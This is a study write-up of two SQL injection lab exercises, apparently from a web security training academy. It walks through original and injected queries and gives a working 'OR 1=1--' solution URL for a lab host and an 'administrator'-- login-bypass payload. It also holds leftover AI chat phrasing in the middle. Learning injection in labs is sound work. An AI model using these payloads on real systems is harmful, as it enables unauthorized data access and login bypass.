
## **SQL Injection 1**
### Analysis
#### Original Query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```

-  This query selects all products from the `products` table where the `category` is 'Gifts' and the product is `released`.

#### Injected Query 1:

```sql
SELECT * FROM products WHERE category = 'Gifts' --' AND released = 1
```

- The `--` sequence is used to comment out the rest of the SQL query.
- The `AND released = 1` part is ignored, potentially displaying all products in the 'Gifts' category, regardless of their release status.

#### Injected Query 2:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

- The condition `OR 1=1` is always true.
- Since `1=1` is always true, the query returns all products, not just those in the 'Gifts' category or those that are released.


### Solution 
```
https://0a9e009b03fe6a7d80663a5b004a0029.web-security-academy.net/filter?category=Gift%27+OR+1=1--
```

Certainly! Here's a detailed and formatted analysis for SQL Injection 2:

---

## SQL Injection 2

### Analysis

#### Original Query:
```sql
SELECT firstname FROM users WHERE username='admin' AND password = 'admin'
```
- **Description:**
  - This query retrieves the `firstname` of the user whose `username` is 'admin' and `password` is 'admin'.
  - If the credentials are correct, the user's firstname is returned.

#### Injected Query 1:
```sql
SELECT firstname FROM users WHERE username='' AND password = 'admin'
```
- **Explanation:**
  - The `username` input is manipulated to be an empty string (`''`).
  - This query checks for a user with an empty `username` and the password 'admin'.
  - Since it's unlikely there is a user with an empty username, the query returns no results.

#### Injected Query 2:
```sql
SELECT firstname FROM users WHERE username='admin'--' AND password = 'admin'
```
- **Explanation:**
  - The `--` sequence comments out the rest of the query.
  - This transforms the query to:

	`SELECT firstname FROM users WHERE username='admin'
  - The `AND password = 'admin'` part is ignored, so the query checks only for the `username` 'admin'.
  - If 'admin' is a valid username, the firstname of the 'admin' user is returned, regardless of the password.

#### Injected Query 3:
```sql
SELECT firstname FROM users WHERE username='administrator'--' AND password = 'admin'
```
- **Explanation:**
  - This query is similar to Injected Query 2 but uses 'administrator' as the username.
  - This transforms the query to:
    ```sql
    SELECT firstname FROM users WHERE username='administrator'
    ```
  - The `AND password = 'admin'` part is ignored, so the query checks only for the `username` 'administrator'.
  - If 'administrator' is a valid username, the firstname of the 'administrator' user is returned, regardless of the password.
  - This demonstrates how different default admin usernames can be tried to gain unauthorized access.

### Example of Exploit

- **Vulnerable URL:**
  - Assuming the application's login URL is:
    ```
    https://example.com/login?username=administrator'--&password=admin
    ```
  - **Explanation:**
    - The URL demonstrates how the payload `administrator'--` can be injected into the `username` parameter.
    - The final query executed by the server will be:
      ```sql
      SELECT firstname FROM users WHERE username='administrator'--' AND password = 'admin'
      ```
    - This will bypass the password check and return the firstname of the 'administrator' user.

---

This analysis provides a clear and structured explanation of how the SQL injection works, using examples to demonstrate the impact of the injected queries.